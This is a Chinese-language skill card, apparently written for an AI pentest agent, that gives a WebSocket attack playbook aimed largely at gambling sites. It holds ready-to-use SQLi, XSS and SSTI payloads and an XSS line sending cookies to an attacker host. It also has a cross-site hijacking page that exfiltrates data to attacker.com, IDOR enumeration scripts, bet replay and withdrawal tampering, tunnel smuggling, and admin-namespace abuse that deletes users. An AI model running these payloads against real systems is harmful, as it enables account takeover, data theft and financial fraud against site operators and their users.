---
name: 长声
description: >-
 WebSocket 渗透完整手法：端点发现、未授权连接、消息注入（SQL/XSS/SSTI）、
 跨站 WebSocket 劫持（CSWSH）、房间/频道 IDOR、消息重放、
 Socket.IO namespace 枚举。
 
 HTTP 层请求走私走 http-request-smuggling；GraphQL WS 走 jwt-bypass-pentest。
version: 1.0.0
---

# WebSocket 渗透完整手法

**前提**：目标在 `授权范围`。不干扰其他真实玩家/用户会话。

---

## 快速入口

```bash
# 自动探测 WS 端点 + 基础消息注入
python3 炼蛊房/ws_probe.py -u https://授权站 --case <案卷>
python3 炼蛊房/ws_probe.py -u wss://授权站/ws --token "$JWT" --case <案卷> --inject
```

---

## §1 发现 WS 端点

```bash
# 从前端 JS 提取
python3 炼蛊房/js_secret_hunter.py hunt -u https://授权站 --case <案卷> | grep -iE "ws://|wss://|socket|websocket"

# grep JS 文件
curl -sk "https://授权站/js/app.js" | grep -oE 'wss?://[^"'"'"']+' | sort -u
curl -sk "https://授权站/js/main.chunk.js" | grep -oE 'wss?://[^"'"'"']+' | sort -u

# Burp: Network → WS 标签，看 101 Switching Protocols
```

**博彩站常见路径**：
```
wss://站/ws wss://站/socket.io/?EIO=4&transport=websocket
wss://站/game/ws wss://站/hall/ws
wss://站/notify wss://站/chat/ws
```

---

## §2 基础连接与消息抓取

```bash
# 安装
npm install -g wscat

# 未鉴权连接（不带 Token）
wscat -c "wss://授权站/ws" --no-check

# 带 Token 连接
wscat -c "wss://授权站/ws" \
 -H "Authorization: Bearer $JWT" \
 -H "Cookie: session=xxx"

# Socket.IO 连接
wscat -c "wss://授权站/socket.io/?EIO=4&transport=websocket"
# 发: 42["subscribe",{"room":"hall"}]
# 收: 42["message",{...}]
```

```python
# Python websockets 批量监听
import asyncio, websockets, json

async def listen(url, token):
 headers = {"Authorization": f"Bearer {token}"}
 async with websockets.connect(url, extra_headers=headers, ssl=True) as ws:
 while True:
 msg = await ws.recv()
 print(json.loads(msg) if msg.startswith("{") else msg)

asyncio.run(listen("wss://授权站/ws", "YOUR_TOKEN"))
```

---

## §3 未授权访问（认证绕过）

```bash
# 测试无 token 是否可连
wscat -c "wss://授权站/ws" --no-check <<EOF
{"action":"getBalance"}
{"action":"getOrderList"}
{"type":"sub","channel":"user_1234"}
EOF

# 测试用他人 userId 订阅
{"action":"subscribe","userId":"1","roomId":"admin"}

# Socket.IO namespace 枚举（常见命名空间）
for ns in /admin /game /chat /pay /notify /internal; do
 wscat -c "wss://授权站/socket.io/?EIO=4&transport=websocket&path=$ns" 2>&1 &
done
```

---

## §4 消息注入攻击

### SQL 注入

```json
// 在房间 ID / 用户参数中注入
{"action":"getRoom","roomId":"1' OR '1'='1"}
{"action":"query","filter":"username=admin'--"}
{"type":"search","q":"'; SELECT version();--"}
```

### XSS（存储型）

```json
// 聊天/公告消息注入
{"action":"chat","msg":"<img src=x onerror=fetch('https://attacker/'+document.cookie)>"}
{"action":"broadcast","content":"<script>alert(document.domain)</script>"}
{"action":"setNickname","name":"<svg onload=alert(1)>"}
```

### SSTI / 命令注入

```json
// 若后端模板渲染消息
{"action":"template","data":"{{7*7}}"}
{"action":"format","msg":"${7*7}"}
{"action":"render","content":"<%= 7*7 %>"}
```

---

## §5 跨站 WebSocket 劫持（CSWSH）

WS 握手不检查 Origin → 攻击者页面可劫持受害者的 WS 连接。

```html
<!-- 攻击者控制页面 -->
<script>
const ws = new WebSocket('wss://授权站/ws');

ws.onopen = () => {
 // 发送敏感操作
 ws.send(JSON.stringify({action: "getProfile"}));
 ws.send(JSON.stringify({action: "listOrders"}));
};

ws.onmessage = (e) => {
 // 外传数据
 fetch('https://attacker.com/collect', {
 method: 'POST',
 body: e.data
 });
};
</script>
```

**验证步骤**：
```bash
# 1. 测试 WS 握手是否验证 Origin
curl -k -H "Upgrade: websocket" -H "Connection: Upgrade" \
 -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
 -H "Sec-WebSocket-Version: 13" \
 -H "Origin: https://attacker.com" \
 https://授权站/ws -v 2>&1 | grep -E "101|403|Origin"
```

---

## §6 房间/频道 IDOR

```python
import asyncio, websockets

async def idor_enum(base_url, token, room_range):
 headers = {"Authorization": f"Bearer {token}"}
 async with websockets.connect(base_url, extra_headers=headers, ssl=True) as ws:
 for room_id in range(1, room_range + 1):
 # 尝试订阅不属于自己的房间
 await ws.send(json.dumps({
 "action": "joinRoom",
 "roomId": str(room_id)
 }))
 try:
 resp = await asyncio.wait_for(ws.recv(), timeout=2)
 data = json.loads(resp)
 if "error" not in str(data).lower():
 print(f"[IDOR] roomId={room_id}: {data}")
 except asyncio.TimeoutError:
 pass

asyncio.run(idor_enum("wss://授权站/game/ws", "YOUR_TOKEN", 100))
```

---

## §7 消息重放与篡改

```bash
# 抓到一笔下注 WS 消息后重放
# 原始：{"action":"bet","amount":100,"gameId":"x","betType":"big"}

wscat -c "wss://授权站/game/ws" -H "Authorization: Bearer $JWT" <<'EOF'
{"action":"bet","amount":100,"gameId":"x","betType":"big"}
{"action":"bet","amount":100,"gameId":"x","betType":"big"}
{"action":"bet","amount":100,"gameId":"x","betType":"big"}
EOF

# 篡改金额（若无服务端校验）
{"action":"bet","amount":0.01,"gameId":"x","betType":"big"}
{"action":"withdraw","amount":99999}
{"action":"transfer","toUser":"1","amount":100}
```

---

## §8 Socket.IO 专项

```javascript
// 客户端 socket.io 测试
const io = require('socket.io-client');
const socket = io('https://授权站', {
 auth: { token: 'YOUR_JWT' },
 transports: ['websocket']
});

// 枚举事件名（从 JS 源码找 socket.on/socket.emit）
socket.onAny((event, ...args) => {
 console.log(`[EVENT] ${event}:`, args);
});

// 发送测试事件
socket.emit('getBalance', {userId: 1});
socket.emit('getOrders', {status: 'all'});
socket.emit('joinRoom', {roomId: '99999'}); // 越权房间
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 发现 WS 端点 + 成功连接 |
| L2 | 未授权数据读取 / IDOR 成功 |
| L3 | 消息注入 XSS/SQLi / CSWSH + 敏感数据外传 |

---

## 真源

- 手法：`传承/长声·注门.md`
- 工具：`python3 炼蛊房/ws_probe.py --help`
- Vue C2 / PTY 8889 / 敲门后的终端通道：先 `c2-zero-trust-console` · `c2_zt_probe.py` 认出 wss，再回本卡打消息/CSWSH

## SRC 猎手补充手法

### WebSocket 隧道走私（H2-over-WS Smuggling）
- **认什么**：反向代理（Varnish/HAProxy/自研网关）在 WebSocket 升级后停止检查帧内容，直接透传 raw TCP；后端应用 WS 端点不验证帧格式
- **打法**：先正常完成 WebSocket 握手（`Upgrade: websocket` + 101 Switching）。然后通过已建立的 WS 隧道发送 raw HTTP 请求（不是 WS 帧），直接打后端内部路径：
  ```python
  import websocket
  ws = websocket.create_connection("wss://target.com/ws",
      header=["Sec-WebSocket-Version: 13"])
  # 握手成功后，发送 raw HTTP（不是 WS 帧）
  ws.sock.send(b"GET /admin/users HTTP/1.1\r\nHost: internal\r\n\r\n")
  print(ws.sock.recv(4096))
  ```
- **算成**：绕过反向代理 ACL/WAF，访问到 `/admin`/`/internal`/`/actuator` 等受限路径
- **假点**：代理重新解帧（如 Cloudflare 解析 WS 帧内容）；后端强制验证 WS 帧 opcode

### Socket.IO Namespace 注入越权
- **认什么**：目标使用 Socket.IO（前端 `<script src="/socket.io/socket.io.js">`）；有多个 namespace（`/admin`、`/chat`、`/monitor`）；namespace 鉴权只在连接时做一次或缺失
- **打法**：普通用户身份连接到管理员 namespace：
  ```javascript
  const io = require("socket.io-client");
  // 用普通用户 cookie 连管理员 namespace
  const admin = io("https://target.com/admin", {
    extraHeaders: { Cookie: "session=普通用户cookie" }
  });
  admin.on("connect", () => {
    admin.emit("listUsers", {});  // 管理事件
    admin.emit("deleteUser", { id: 1 });
  });
  ```
  枚举 namespace：从 JS 源码搜 `io('/'`、`io.of('`、`socket.on` 找所有 namespace 和事件名
- **算成**：普通用户连上管理员 namespace 并成功触发管理事件（列用户/改配置/踢人）
- **假点**：每个 namespace 有独立中间件校验角色；连接成功但 emit 管理事件被 ACL 拒绝

### 二进制 WebSocket 消息操纵（Protobuf/MsgPack）
- **认什么**：WS 消息是二进制帧（Burp 显示 Binary）；前端有 `protobuf.js`/`msgpack`/`flatbuffers` 依赖；`.proto` 文件可能在 JS bundle 或 sourcemap 中
- **打法**：从前端 JS 提取 `.proto` 定义或 MsgPack schema → 用 `protoc` 编解码 → 修改关键字段（userId/amount/role）后重发。如果没有 schema，用 `protoc --decode_raw` 盲解：
  ```bash
  # 从 Burp 导出二进制帧
  cat ws_frame.bin | protoc --decode_raw
  # 修改字段后重编码发送
  echo "1: 99999  2: 1000" | protoc --encode=Request msg.proto | \
    websocat -b wss://target.com/ws
  ```
- **算成**：修改 userId 后返回他人数据（IDOR）；修改 amount 后服务端接受篡改值
- **假点**：服务端校验消息签名/HMAC；修改后返回 protobuf 解析错误；schema 不可获取
